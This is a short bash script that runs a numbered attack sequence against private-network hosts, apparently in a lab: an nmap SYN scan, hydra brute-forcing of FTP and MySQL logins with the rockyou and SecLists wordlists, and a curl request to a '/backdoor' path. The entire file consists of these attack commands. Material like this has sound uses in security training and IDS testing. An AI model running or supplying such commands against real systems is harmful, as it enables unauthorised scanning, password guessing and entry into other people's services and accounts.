#!/bin/bash

echo "[1] NMAP scan..."
nmap -sS 172.28.0.15

echo "[2] Brute Force FTP..."
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://192.168.100.20

echo "[3] HTTP access to /backdoor"
curl http://192.168.100.20/backdoor

echo "[4] Brute Force MySQL"
hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt  192.168.100.20 mysql